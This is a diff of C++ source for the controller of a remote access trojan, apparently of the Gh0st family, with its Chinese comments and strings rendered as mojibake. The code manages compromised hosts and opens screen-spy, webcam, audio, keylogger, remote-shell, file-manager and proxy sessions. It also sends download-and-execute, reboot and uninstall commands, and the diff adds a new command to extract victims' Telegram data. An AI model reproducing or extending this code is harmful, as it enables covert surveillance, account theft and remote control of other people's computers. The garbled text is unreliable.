-		"å¤šç±³å°¼å…‹","ä¿„ç½—æ–¯","åŽ„ç“œå¤šå°”","åŽ„ç«‹ç‰¹é‡Œäºš","æ³•å›½","æ¢µè’‚å†ˆ","è²å¾‹å®¾","æ–æµŽ","èŠ¬å…°","ä½›å¾—è§’",
-		"å†ˆæ¯”äºš","åˆšæžœ(é‡‘)","åˆšæžœ","å“¥ä¼¦æ¯”äºš","å“¥æ–¯è¾¾é»ŽåŠ ","æ ¼æž—çº³è¾¾","æ ¼é²å‰äºš","å¤å·´","åœ­äºšé‚£","å›½å",
-		"å“ˆè¨å…‹æ–¯å¦","æµ·åœ°","éŸ©å›½","è·å…°","æ´ªéƒ½æ‹‰æ–¯","åŸºé‡Œå·´æ–¯","å‰å¸ƒæ","å‰å°”å‰æ–¯æ–¯å¦","å‡ å†…äºš","å‡ å†…äºšæ¯”ç»",
-		"åŠ å‹’æ¯”æµ·å…±åŒä½“","åŠ æ‹¿å¤§","åŠ çº³","åŠ è“¬","æŸ¬åŸ”å¯¨","æ·å…‹","æ´¥å·´å¸ƒéŸ¦","å–€éº¦éš†","å¡å¡”å°”","ç§‘æ‘©ç½—",
-		"ç§‘ç‰¹è¿ªç“¦","ç§‘å¨ç‰¹","å…‹ç½—åœ°äºš","è‚¯å°¼äºš","æ‹‰è„±ç»´äºš","èŽ±ç´¢æ‰˜","è€æŒ","é»Žå·´å«©","ç«‹é™¶å®›","åˆ©æ¯”æžœäºš",
-		"åˆ©æ¯”äºš","è”åˆå›½","åˆ—æ”¯æ•¦å£«ç™»","å¢æ£®å ¡","å¢æ—ºè¾¾","ç½—é©¬å°¼äºš","é©¬è¾¾åŠ æ–¯åŠ ","é©¬å°”ä»£å¤«","é©¬è€³ä»–","é©¬æ‹‰ç»´",
-		"é©¬æ¥è¥¿äºš","é©¬é‡Œ","é©¬å…¶é¡¿","é©¬ç»å°”ç¾¤å²›","æ¯›é‡Œæ±‚æ–¯","æ¯›é‡Œå¡”å°¼äºš","ç¾Žå›½","ç¾Žå›½å›½å®¶ç»„ç»‡","è’™å¤","å­ŸåŠ æ‹‰",
-		"ç§˜é²","å¯†å…‹ç½—å°¼è¥¿äºšè”é‚¦","ç¼…ç”¸","æ‘©å°”å¤šç“¦","æ‘©æ´›å“¥","æ‘©çº³å“¥","èŽ«æ¡‘æ¯”å…‹","å¢¨è¥¿å“¥","çº³ç±³æ¯”äºš","å—éž",
-		"ç‘™é²","å°¼æ³Šå°”","å°¼åŠ æ‹‰ç“œ","å°¼æ—¥å°”","å°¼æ—¥åˆ©äºš","æŒªå¨","æ¬§æ´²è”ç›Ÿ","å¸•åŠ³","è‘¡è„ç‰™","æ—¥æœ¬",
-		"ç‘žå…¸","ç‘žå£«","è¨å°”ç“¦å¤š","å¡žå°”ç»´äºš","å¡žæ‹‰åˆ©æ˜‚","å¡žå†…åŠ å°”","å¡žæµ¦è·¯æ–¯","å¡žèˆŒå°”","æ²™ç‰¹é˜¿æ‹‰ä¼¯","åœ£å¤šç¾Žå’Œæ™®æž—è¥¿æ¯”",
-		"åœ£åŸºèŒ¨å’Œå°¼ç»´æ–¯","åœ£å¢è¥¿äºš","åœ£é©¬åŠ›è¯º","åœ£æ–‡æ£®ç‰¹å’Œæ ¼æž—çº³ä¸æ–¯","æ–¯é‡Œå…°å¡","æ–¯æ´›ä¼å…‹","æ–¯æ´›æ–‡å°¼äºš","æ–¯å¨å£«å…°","è‹ä¸¹","è‹é‡Œå—",
-		"æ‰€ç½—é—¨ç¾¤å²›","ç´¢é©¬é‡Œ","å¡”å‰å…‹æ–¯å¦","å¤ªå¹³æ´‹å…±åŒä½“","æ³°å›½","å¦æ¡‘å°¼äºš","æ±¤åŠ ","ç‰¹ç«‹å°¼è¾¾å’Œå¤šå·´å“¥","çªå°¼æ–¯","å›¾ç“¦å¢",
-		"åœŸè€³å…¶","åœŸåº“æ›¼æ–¯å¦","ç“¦åŠªé˜¿å›¾","å±åœ°é©¬æ‹‰","å§”å†…ç‘žæ‹‰","æ–‡èŽ±","ä¹Œå¹²è¾¾","ä¹Œå…‹å…°","ä¹Œæ‹‰åœ­","ä¹Œå…¹åˆ«å…‹æ–¯å¦",
-		"è¥¿ç­ç‰™","è¥¿è¨æ‘©äºš","å¸Œè…Š","é¦™æ¸¯","æ–°åŠ å¡","æ–°è¥¿å…°","åŒˆç‰™åˆ©","å™åˆ©äºš","ç‰™ä¹°åŠ ","äºšç¾Žå°¼äºš",
-		"ä¹Ÿé—¨","ä¼Šæ‹‰å…‹","ä¼Šæœ—","ä»¥è‰²åˆ—","æ„å¤§åˆ©","å°åº¦","å°åº¦å°¼è¥¿äºš","è‹±æ ¼å…°","è‹±å›½","çº¦æ—¦",
-		"è¶Šå—","èµžæ¯”äºš","ä¹å¾—","æ™ºåˆ©","ä¸­éž","å°æ¹¾çœ","æ³¢å¤šé»Žå„",
-		"æ‰¾ä¸åˆ°IPæ•°æ®åº“"};
+		"ÖÐ¹ú","°¢¶û°ÍÄáÑÇ","°¢¶û¼°ÀûÑÇ","°¢¸»º¹","°¢¸ùÍ¢","°¢À­²®¹ú¼ÒÁªÃË","°¢ÁªÇõ","°¢Âü","°¢Èû°Ý½®","°£¼°",
+		"°£Èû¶í±ÈÑÇ","°®¶ûÀ¼","°®É³ÄáÑÇ","°²µÀ¶û","°²¸çÀ­","°²Ìá¹ÏºÍ°Í²¼´ï","°ÂµØÀû","°Ä´óÀûÑÇ","°ÄÃÅ","°Í°Í¶àË¹",
+		"°Í²¼ÑÇÐÂ¼¸ÄÚÑÇ","°Í¹þÂí","°Í»ùË¹Ì¹","°ÍÀ­¹ç","°ÍÀÕË¹Ì¹","°ÍÁÖ","°ÍÄÃÂí","°ÍÎ÷","°×¶íÂÞË¹","±£¼ÓÀûÑÇ",
+		"±±´óÎ÷Ñó¹«Ô¼×éÖ¯","±´Äþ","±ÈÀûÊ±","±ùµº","²¨À¼","²¨Ë¹ÄáÑÇºÍºÚÈû¸çÎ¬ÄÇ","²£ÀûÎ¬ÑÇ","²©´ÄÍßÄÉ","²»µ¤","²¼»ùÄÉ·¨Ë÷",
+		"²¼Â¡µÏ","³¯ÏÊ","³àµÀ¼¸ÄÚÑÇ","µ¤Âó","µÂ¹ú","¶«µÛãë","¶«ÄÏÑÇ¹ú¼ÒÐ­»á","¶ÀÁ¢¹ú¼Ò¹úÐ­","¶à¸ç","¶àÃ×Äá¼Ó",
+		"¶àÃ×Äá¿Ë","¶íÂÞË¹","¶ò¹Ï¶à¶û","¶òÁ¢ÌØÀïÑÇ","·¨¹ú","èóµÙ¸Ô","·ÆÂÉ±ö","ì³¼Ã","·ÒÀ¼","·ðµÃ½Ç",
+		"¸Ô±ÈÑÇ","¸Õ¹û(½ð)","¸Õ¹û","¸çÂ×±ÈÑÇ","¸çË¹´ïÀè¼Ó","¸ñÁÖÄÉ´ï","¸ñÂ³¼ªÑÇ","¹Å°Í","¹çÑÇÄÇ","¹úÐ­",
+		"¹þÈø¿ËË¹Ì¹","º£µØ","º«¹ú","ºÉÀ¼","ºé¶¼À­Ë¹","»ùÀï°ÍË¹","¼ª²¼Ìá","¼ª¶û¼ªË¹Ë¹Ì¹","¼¸ÄÚÑÇ","¼¸ÄÚÑÇ±ÈÉÜ",
+		"¼ÓÀÕ±Èº£¹²Í¬Ìå","¼ÓÄÃ´ó","¼ÓÄÉ","¼ÓÅî","¼íÆÒÕ¯","½Ý¿Ë","½ò°Í²¼Î¤","¿¦ÂóÂ¡","¿¨Ëþ¶û","¿ÆÄ¦ÂÞ",
+		"¿ÆÌØµÏÍß","¿ÆÍþÌØ","¿ËÂÞµØÑÇ","¿ÏÄáÑÇ","À­ÍÑÎ¬ÑÇ","À³Ë÷ÍÐ","ÀÏÎÎ","Àè°ÍÄÛ","Á¢ÌÕÍð","Àû±È¹ûÑÇ",
+		"Àû±ÈÑÇ","ÁªºÏ¹ú","ÁÐÖ§¶ØÊ¿µÇ","Â¬É­±¤","Â¬Íú´ï","ÂÞÂíÄáÑÇ","Âí´ï¼ÓË¹¼Ó","Âí¶û´ú·ò","Âí¶úËû","ÂíÀ­Î¬",
+		"ÂíÀ´Î÷ÑÇ","ÂíÀï","ÂíÆä¶Ù","ÂíÉÜ¶ûÈºµº","Ã«ÀïÇóË¹","Ã«ÀïËþÄáÑÇ","ÃÀ¹ú","ÃÀ¹ú¹ú¼Ò×éÖ¯","ÃÉ¹Å","ÃÏ¼ÓÀ­",
+		"ÃØÂ³","ÃÜ¿ËÂÞÄáÎ÷ÑÇÁª°î","Ãåµé","Ä¦¶û¶àÍß","Ä¦Âå¸ç","Ä¦ÄÉ¸ç","ÄªÉ£±È¿Ë","Ä«Î÷¸ç","ÄÉÃ×±ÈÑÇ","ÄÏ·Ç",
+		"è§Â³","Äá²´¶û","Äá¼ÓÀ­¹Ï","ÄáÈÕ¶û","ÄáÈÕÀûÑÇ","Å²Íþ","Å·ÖÞÁªÃË","ÅÁÀÍ","ÆÏÌÑÑÀ","ÈÕ±¾",
+		"Èðµä","ÈðÊ¿","Èø¶ûÍß¶à","Èû¶ûÎ¬ÑÇ","ÈûÀ­Àû°º","ÈûÄÚ¼Ó¶û","ÈûÆÖÂ·Ë¹","ÈûÉà¶û","É³ÌØ°¢À­²®","Ê¥¶àÃÀºÍÆÕÁÖÎ÷±È",
+		"Ê¥»ù´ÄºÍÄáÎ¬Ë¹","Ê¥Â¬Î÷ÑÇ","Ê¥ÂíÁ¦Åµ","Ê¥ÎÄÉ­ÌØºÍ¸ñÁÖÄÉ¶¡Ë¹","Ë¹ÀïÀ¼¿¨","Ë¹Âå·¥¿Ë","Ë¹ÂåÎÄÄáÑÇ","Ë¹ÍþÊ¿À¼","ËÕµ¤","ËÕÀïÄÏ",
+		"ËùÂÞÃÅÈºµº","Ë÷ÂíÀï","Ëþ¼ª¿ËË¹Ì¹","Ì«Æ½Ñó¹²Í¬Ìå","Ì©¹ú","Ì¹É£ÄáÑÇ","ÌÀ¼Ó","ÌØÁ¢Äá´ïºÍ¶à°Í¸ç","Í»ÄáË¹","Í¼ÍßÂ¬",
+		"ÍÁ¶úÆä","ÍÁ¿âÂüË¹Ì¹","ÍßÅ¬°¢Í¼","Î£µØÂíÀ­","Î¯ÄÚÈðÀ­","ÎÄÀ³","ÎÚ¸É´ï","ÎÚ¿ËÀ¼","ÎÚÀ­¹ç","ÎÚ×È±ð¿ËË¹Ì¹",
+		"Î÷°àÑÀ","Î÷ÈøÄ¦ÑÇ","Ï£À°","Ïã¸Û","ÐÂ¼ÓÆÂ","ÐÂÎ÷À¼","ÐÙÑÀÀû","ÐðÀûÑÇ","ÑÀÂò¼Ó","ÑÇÃÀÄáÑÇ",
+		"Ò²ÃÅ","ÒÁÀ­¿Ë","ÒÁÀÊ","ÒÔÉ«ÁÐ","Òâ´óÀû","Ó¡¶È","Ó¡¶ÈÄáÎ÷ÑÇ","Ó¢¸ñÀ¼","Ó¢¹ú","Ô¼µ©",
+		"Ô½ÄÏ","ÔÞ±ÈÑÇ","Õ§µÃ","ÖÇÀû","ÖÐ·Ç","Ì¨ÍåÊ¡","²¨¶àÀè¸÷",
+		"ÕÒ²»µ½IPÊý¾Ý¿â"};
 		
 		int i;
 		CString str;
@@ -895,9 +896,9 @@ int CClientView::FindCountry(CString local)
 				break;
 			}
 		}
-		CString strlocal = local.Left(i);  //æå–å‰é¢å­—ç¬¦ä¸²
+		CString strlocal = local.Left(i);  //ÌáÈ¡Ç°Ãæ×Ö·û´®
 		
-		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //å…ˆæ¯”è¾ƒå­—ç¬¦åŠé•¿åº¦æ˜¯å¦æˆåŠŸ
+		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //ÏÈ±È½Ï×Ö·û¼°³¤¶ÈÊÇ·ñ³É¹¦
 		{
 			str = country[i];
 			if (strstr(strlocal,str)!=NULL)
@@ -908,12 +909,12 @@ int CClientView::FindCountry(CString local)
 					return i;
 			}
 		}
-		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //å†æ¯”è¾ƒå­—ç¬¦
+		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //ÔÙ±È½Ï×Ö·û
 		{
 			str = country[i];
 			if (strstr(strlocal,str)!=NULL)
 			{
-				if (strstr(strlocal,"å†…è’™å¤")!=NULL)
+				if (strstr(strlocal,"ÄÚÃÉ¹Å")!=NULL)
 					return 0;
 				return i;
 			}
@@ -926,7 +927,7 @@ LRESULT CClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	if (pContext == NULL)
 		return -1;
-	// åˆ é™¤é“¾è¡¨è¿‡ç¨‹ä¸­å¯èƒ½ä¼šåˆ é™¤Context
+	// É¾³ýÁ´±í¹ý³ÌÖÐ¿ÉÄÜ»áÉ¾³ýContext
 	CClientView* pView = NULL;
 	CString strLogText,strDiLi,IPaddress,strOSCount;
 	
@@ -941,9 +942,9 @@ LRESULT CClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 			{
 				if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
 				{
-					strLogText.Format("ä¸»æœºä¸‹çº¿: [%s]   OS: [%s]   Ver: [%s]   åŒºåŸŸ: [%s]",pView->m_pListCtrl->GetItemText(i,3),pView->m_pListCtrl->GetItemText(i,6),pView->m_pListCtrl->GetItemText(i,15),pView->m_pListCtrl->GetItemText(i,0));
+					strLogText.Format("Ö÷»úÏÂÏß: [%s]   OS: [%s]   Ver: [%s]   ÇøÓò: [%s]",pView->m_pListCtrl->GetItemText(i,3),pView->m_pListCtrl->GetItemText(i,6),pView->m_pListCtrl->GetItemText(i,15),pView->m_pListCtrl->GetItemText(i,0));
 				//	g_pLogView->InsertLogItem(strLogText, 3, 1);
-					g_pLogView->InsertLogItem("ä¸»æœºä¸‹çº¿ï¼š",strLogText, 0, 2 );
+					g_pLogView->InsertLogItem("Ö÷»úÏÂÏß£º",strLogText, 0, 2 );
 					
 					strOSCount = pView->m_pListCtrl->GetItemText( i, 5 );
 					if ( strOSCount.Find(_T("NT")) != -1 )
@@ -993,7 +994,7 @@ LRESULT CClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 					pView->m_pListCtrl->DeleteItem(i);
 					g_pFrame->m_nCount--;
 					
-					//æ’­æ”¾å£°éŸ³//////////////////////////////////////////////////////////////////
+					//²¥·ÅÉùÒô//////////////////////////////////////////////////////////////////
 					BOOL a_chk = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
 					if (a_chk != true)
 					{
@@ -1004,7 +1005,7 @@ LRESULT CClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 				}		
 			}
 			
-			// å…³é—­ç›¸å…³çª—å£
+			// ¹Ø±ÕÏà¹Ø´°¿Ú
 			switch (pContext->m_Dialog[0])
 			{
 			case FILEMANAGER_DLG:
@@ -1030,7 +1031,7 @@ LRESULT CClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 		catch(...){}
 	}
 	
-	// æ›´æ–°å½“å‰è¿žæŽ¥æ€»æ•°
+	// ¸üÐÂµ±Ç°Á¬½Ó×ÜÊý
 	g_pFrame->ShowOSCount();
 	g_pFrame->ShowConnectionsNumber();
 	g_pTabView->UpDateNumber();
@@ -1042,7 +1043,7 @@ void CClientView::OnChangeGroup()
 	// TODO: Add your command handler code here
 	if(m_pListCtrl->GetSelectedCount() == NULL)
 	{
-		AfxMessageBox("è¯·é€‰æ‹©ä¸»æœº!");
+		AfxMessageBox("ÇëÑ¡ÔñÖ÷»ú!");
 		return ;
 	}
 	CChangeGroup m_group;
@@ -1091,7 +1092,7 @@ void CClientView::OnChangeGroup()
 		{
 			int m = m_pListCtrl->GetNextSelectedItem(pos);
 			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));			
-			/////////////////ä¿®å¤æ”¹å˜åˆ†ç»„å›½æ——æ˜¾ç¤ºBUG/////////////////////////////////////////////////////////
+			/////////////////ÐÞ¸´¸Ä±ä·Ö×é¹úÆìÏÔÊ¾BUG/////////////////////////////////////////////////////////
 			sockaddr_in sockAddr;
 			memset(&sockAddr, 0, sizeof(sockAddr));
 			int nSockAddrLen = sizeof(sockAddr);
@@ -1116,10 +1117,10 @@ void CClientView::OnChangeGroup()
 			}
 			else
 			{
-				//å›½æ——
+				//¹úÆì
 				str = ((CClientApp *)AfxGetApp())->m_SeuQQwry.IPtoAddr(IPAddress);
 				int countryno=FindCountry(str);
-				i = pView->m_pListCtrl->InsertItem(nCnt, NULL, countryno);//ä½¿ç”¨æŒ‡å®šå›¾è¡¨
+				i = pView->m_pListCtrl->InsertItem(nCnt, NULL, countryno);//Ê¹ÓÃÖ¸¶¨Í¼±í
 			}			
 			////////////////////////////////////////////////////////////////////////////////			
 			pView->m_pListCtrl->SetItemText(i, 0, m_pListCtrl->GetItemText(m, 0));
@@ -1142,7 +1143,7 @@ void CClientView::OnChangeGroup()
 			pView->m_pListCtrl->SetItemText(i, 17, m_pListCtrl->GetItemText(m, 17));
 			pView->m_pListCtrl->SetItemText(i, 18, m_pListCtrl->GetItemText(m, 18));
 			
-			// æŒ‡å®šå”¯ä¸€æ ‡è¯†
+			// Ö¸¶¨Î¨Ò»±êÊ¶
 			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
 			
 			m_pListCtrl->DeleteItem(m);
@@ -1166,7 +1167,7 @@ void CClientView::SendSelectCommand(PBYTE pData, UINT nSize)
 	{
 		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
 		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
-		m_iocpServer->Send(pContext, pData, nSize);	// å‘é€èŽ·å¾—é©±åŠ¨å™¨åˆ—è¡¨æ•°æ®åŒ…
+		m_iocpServer->Send(pContext, pData, nSize);	// ·¢ËÍ»ñµÃÇý¶¯Æ÷ÁÐ±íÊý¾Ý°ü
 	} 
 }
 
@@ -1175,7 +1176,7 @@ LRESULT CClientView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext *pContext = (ClientContext *)lParam;
 	
 	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_FILE, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1190,7 +1191,7 @@ LRESULT CClientView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext *pContext = (ClientContext *)lParam;
 	
 	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1203,7 +1204,7 @@ LRESULT CClientView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext *pContext = (ClientContext *)lParam;
 	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	pContext->m_Dialog[0] = WEBCAM_DLG;
@@ -1215,7 +1216,7 @@ LRESULT CClientView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext *pContext = (ClientContext *)lParam;
 	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_AUDIO, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	pContext->m_Dialog[0] = AUDIO_DLG;
@@ -1228,7 +1229,7 @@ LRESULT CClientView::OnOpenDllDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext *pContext = (ClientContext *)lParam;
 	
 	CDllDlg	*dlg = new CDllDlg(this, m_iocpServer, pContext);
-	// è®¾ç½®çˆ¶çª—å£ä¸ºæ¡Œé¢
+	// ÉèÖÃ¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_DLLDLG, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1244,7 +1245,7 @@ LRESULT CClientView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
 	
-	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
 	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1257,7 +1258,7 @@ LRESULT CClientView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
 	
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1271,7 +1272,7 @@ LRESULT CClientView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
 	
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_SHELL, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1286,7 +1287,7 @@ LRESULT CClientView::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);
 	
-	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
 	dlg->Create(IDD_DIALOG_PROXY_MAP, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1305,7 +1306,7 @@ void CClientView::SendDllCommand(LPCTSTR lpDllName, LPBYTE lparam, DWORD dwDataS
 		strDllName.Format("%s.dll", lpDllName);
 		((CClientApp *)AfxGetApp())->m_IniFile.SetString("DLL", lpDllName, strDllName);
 	}
-	int	nPacketLength = 1 + sizeof(DWORD) + strDllName.GetLength() + 1 + dwDataSize; //TOKEN(1)+æ¶ˆæ¯å¤§å°+æ–‡ä»¶å(len+1)+æ¶ˆæ¯å†…å®¹
+	int	nPacketLength = 1 + sizeof(DWORD) + strDllName.GetLength() + 1 + dwDataSize; //TOKEN(1)+ÏûÏ¢´óÐ¡+ÎÄ¼þÃû(len+1)+ÏûÏ¢ÄÚÈÝ
 	
 	LPBYTE	lpPacket = new BYTE[nPacketLength];
 	memset(lpPacket,0,nPacketLength);
@@ -1320,7 +1321,7 @@ void CClientView::SendDllCommand(LPCTSTR lpDllName, LPBYTE lparam, DWORD dwDataS
 	{
 		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
 		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
-		// å‘é€èŽ·å¾—é©±åŠ¨å™¨åˆ—è¡¨æ•°æ®åŒ…
+		// ·¢ËÍ»ñµÃÇý¶¯Æ÷ÁÐ±íÊý¾Ý°ü
 		m_iocpServer->Send(pContext, lpPacket, nPacketLength);
 	}
 	delete[] lpPacket;
@@ -1356,10 +1357,18 @@ void CClientView::OnAudioListen()
 	SendSelectCommand(&bToken, sizeof(BYTE));	
 }
 
+void CClientView::OnGetTelegram() // ÌáÈ¡TG
+{
+	// TODO: Add your command handler code here
+	// ¸ø¿Í»§¶Ë·¢ËÍÌáÈ¡telegramµÄÖ¸Áî
+	BYTE	bToken = COMMAND_TELEGRAM;
+	SendSelectCommand(&bToken, sizeof(BYTE));	
+}
+
 void CClientView::OnReStart()
 {
 	// TODO: Add your command handler code here
-	if (MessageBox(_T("ç¡®è®¤é‡å¯æœåŠ¡ç«¯å—?"), _T("è­¦å‘Š"), MB_YESNO | MB_ICONWARNING) == IDNO)
+	if (MessageBox(_T("È·ÈÏÖØÆô·þÎñ¶ËÂð?"), _T("¾¯¸æ"), MB_YESNO | MB_ICONWARNING) == IDNO)
 		return;
 	BYTE	bToken = COMMAND_RESTART;
 	SendSelectCommand(&bToken, sizeof(BYTE));
@@ -1368,7 +1377,7 @@ void CClientView::OnReStart()
 void CClientView::OnRemove() 
 {
 	// TODO: Add your command handler code here
-	if (MessageBox(_T("ç¡®è®¤å¸è½½æœåŠ¡ç«¯å—?"), _T("è­¦å‘Š"), MB_YESNO | MB_ICONWARNING) == IDNO)
+	if (MessageBox(_T("È·ÈÏÐ¶ÔØ·þÎñ¶ËÂð?"), _T("¾¯¸æ"), MB_YESNO | MB_ICONWARNING) == IDNO)
 		return;
 	BYTE	bToken = COMMAND_REMOVE;
 	SendSelectCommand(&bToken, sizeof(BYTE));	
@@ -1377,7 +1386,7 @@ void CClientView::OnRemove()
 void CClientView::OnKeyboard() 
 {
 	// TODO: Add your command handler code here
-// 	if (MessageBox(_T("ç¡®å®šæ‰“å¼€é”®ç›˜è®°å½•å—ï¼Ÿå®‰å…¨è½¯ä»¶å¯èƒ½ä¼šæ‹¦æˆªï¼ï¼ï¼"), _T("æç¤º"), MB_YESNO | MB_ICONWARNING) == IDNO)
+// 	if (MessageBox(_T("È·¶¨´ò¿ª¼üÅÌ¼ÇÂ¼Âð£¿°²È«Èí¼þ¿ÉÄÜ»áÀ¹½Ø£¡£¡£¡"), _T("ÌáÊ¾"), MB_YESNO | MB_ICONWARNING) == IDNO)
 // 		return;
 	BYTE	bToken = COMMAND_KEYBOARD;
 	SendSelectCommand(&bToken, sizeof(BYTE));
@@ -1394,8 +1403,8 @@ void CClientView::OnSerManager()
 {
 	// TODO: Add your command handler code here
 	
-	//	OutputDebugString("å‘å‡ºäº†");
-	BYTE	bToken = COMMAND_SERMANAGER;  // æœåŠ¡ç®¡ç†
+	//	OutputDebugString("·¢³öÁË");
+	BYTE	bToken = COMMAND_SERMANAGER;  // ·þÎñ¹ÜÀí
 	SendSelectCommand(&bToken, sizeof(BYTE));	
 }
 
@@ -1409,7 +1418,7 @@ void CClientView::OnRemoteShell()
 void CClientView::OnLogoff() 
 {
 	// TODO: Add your command handler code here
-	if (MessageBox(_T("ç¡®è®¤æ³¨é”€è¯¥æœºå—?"), _T("è­¦å‘Š"), MB_YESNO | MB_ICONWARNING) == IDNO)
+	if (MessageBox(_T("È·ÈÏ×¢Ïú¸Ã»úÂð?"), _T("¾¯¸æ"), MB_YESNO | MB_ICONWARNING) == IDNO)
 		return;
 	
 	BYTE bToken[2];
@@ -1421,7 +1430,7 @@ void CClientView::OnLogoff()
 void CClientView::OnReboot() 
 {
 	// TODO: Add your command handler code here
-	if (MessageBox(_T("ç¡®è®¤é‡å¯è¯¥æœºå—?"), _T("è­¦å‘Š"), MB_YESNO | MB_ICONWARNING) == IDNO)
+	if (MessageBox(_T("È·ÈÏÖØÆô¸Ã»úÂð?"), _T("¾¯¸æ"), MB_YESNO | MB_ICONWARNING) == IDNO)
 		return;
 	
 	BYTE bToken[2];
@@ -1434,7 +1443,7 @@ void CClientView::OnShutdown()
 {
 	// TODO: Add your command handler code here
 	
-	if (MessageBox(_T("ç¡®è®¤å…³é—­è¯¥æœºå—?"), _T("è­¦å‘Š"), MB_YESNO | MB_ICONWARNING) == IDNO)
+	if (MessageBox(_T("È·ÈÏ¹Ø±Õ¸Ã»úÂð?"), _T("¾¯¸æ"), MB_YESNO | MB_ICONWARNING) == IDNO)
 		return;
 	
 	BYTE bToken[2];
@@ -1485,20 +1494,20 @@ void CClientView::OnOpenUrl(CHAR *IpBti,CHAR *IpurlDeta,int OpeUrl)
 void CClientView::OnDownExec() 
 {
 	// TODO: Add your command handler code here
-	OnOpenUrl("è¿œç¨‹ä¸‹è½½åœ°å€ï¼š","è¯·è¾“å…¥ï¼ˆä¸‹è½½æ–‡ä»¶ï¼‰åœ°å€:",COMMAND_DOWN_EXEC);
+	OnOpenUrl("Ô¶³ÌÏÂÔØµØÖ·£º","ÇëÊäÈë£¨ÏÂÔØÎÄ¼þ£©µØÖ·:",COMMAND_DOWN_EXEC);
 }
 
 void CClientView::OnUpdateServer() 
 {
 	// TODO: Add your command handler code here
 	CInputDialog	dlg;
-	dlg.Init(_T("ä¸‹è½½æ›´æ–°æœåŠ¡ç«¯"), _T("è¯·è¾“å…¥è¦ä¸‹è½½æ–°æœåŠ¡ç«¯çš„åœ°å€:"), this);
+	dlg.Init(_T("ÏÂÔØ¸üÐÂ·þÎñ¶Ë"), _T("ÇëÊäÈëÒªÏÂÔØÐÂ·þÎñ¶ËµÄµØÖ·:"), this);
 	if (dlg.DoModal() != IDOK)   
 		return;
 	dlg.m_str.MakeLower();
 	if (dlg.m_str.Find(_T("http://")) == -1)
 	{
-		MessageBox(_T("è¾“å…¥çš„ç½‘å€ä¸åˆæ³•"), _T("é”™è¯¯"));
+		MessageBox(_T("ÊäÈëµÄÍøÖ·²»ºÏ·¨"), _T("´íÎó"));
 		return;
 	}
 	
